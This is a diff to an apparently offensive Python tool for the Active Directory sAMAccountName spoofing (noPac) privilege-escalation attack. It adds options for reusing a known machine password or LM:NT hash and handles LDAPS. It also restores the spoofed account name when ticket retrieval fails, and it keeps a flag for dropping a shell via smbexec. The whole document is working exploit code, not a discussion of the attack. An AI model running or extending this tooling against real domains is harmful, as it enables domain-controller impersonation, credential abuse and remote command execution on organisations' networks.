@@ -80,7 +80,14 @@ def samtheadmin(username, password, domain, options):
     else:
         new_computer_name = 'WIN-'+''.join(random.sample(string.ascii_letters + string.digits, 11)).upper()
 
-    if options.new_pass:
+    if options.old_hash:
+        if ":" not in options.old_hash:
+            logging.error("Hash format error.")
+            return
+        options.old_pass = options.old_hash
+    if options.old_pass:
+        new_computer_password = options.old_pass
+    elif options.new_pass:
         new_computer_password = options.new_pass
     else:
         new_computer_password = ''.join(random.choice(characters) for _ in range(12))
@@ -105,14 +112,19 @@ def samtheadmin(username, password, domain, options):
     dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
     if dn and options.no_add:
         logging.info(f'{new_computer_name} already exists! Using force mode.')
-        ldap_session.extend.microsoft.modify_password(str(dn['dn']), new_computer_password)
-        if ldap_session.result['result'] == 0:
-            logging.info(f'Modify password successfully, host: {new_computer_name} password: {new_computer_password}')
-        else:
-            logging.error('Cannot change the machine password , exit.')
-            return
+        if not options.old_pass:
+            if options.use_ldap:
+                logging.error(f'Modify password need ldaps !')
+                return
+            ldap_session.extend.microsoft.modify_password(str(dn['dn']), new_computer_password)
+            if ldap_session.result['result'] == 0:
+                logging.info(f'Modify password successfully, host: {new_computer_name} password: {new_computer_password}')
+            else:
+                logging.error('Cannot change the machine password , exit.')
+                return
     elif options.no_add and not dn:
         logging.error(f'Target {new_computer_name} not exists!')
+        return
     elif dn:
         logging.error(f'Account {new_computer_name} already exists!')
         return 
@@ -199,8 +211,21 @@ def samtheadmin(username, password, domain, options):
     options.hashes = None
     
     # Getting a ticke
-    getting_tgt = GETTGT(dc_host, new_computer_password, domain, options)
-    getting_tgt.run()
+    try:
+        getting_tgt = GETTGT(dc_host, new_computer_password, domain, options)
+        getting_tgt.run()
+    except Exception as e:
+        logging.error(f"GetTGT error, error: {e}")
+         # Restoring Old Values when get TGT error.
+        logging.info(f"Resting the machine account to {new_computer_name}")
+        dn = get_user_info(dc_host, ldap_session, domain_dumper)
+        ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_computer_name]]})
+        if ldap_session.result['result'] == 0:
+            logging.info(f'Restored {new_computer_name} sAMAccountName to original value')
+        else:
+            logging.error('Cannot restore the old name lol')
+        return
+
     dcticket = str(dc_host + '.ccache')
 
     # Restoring Old Values
@@ -241,6 +266,8 @@ if __name__ == '__main__':
     parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
     parser.add_argument('-new-name', action='store', metavar='NEWNAME', help='Target computer name, if not specified, will be random generated.')
     parser.add_argument('-new-pass', action='store', metavar='PASSWORD', help='Add new computer password, if not specified, will be random generated.')
+    parser.add_argument('-old-pass', action='store', metavar='PASSWORD', help='Target computer password, use if you know the password of the target you input with -new-name.')
+    parser.add_argument('-old-hash', action='store', metavar='LMHASH:NTHASH', help='Target computer hashes, use if you know the hash of the target you input with -new-name.')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-shell', action='store_true', help='Drop a shell via smbexec')
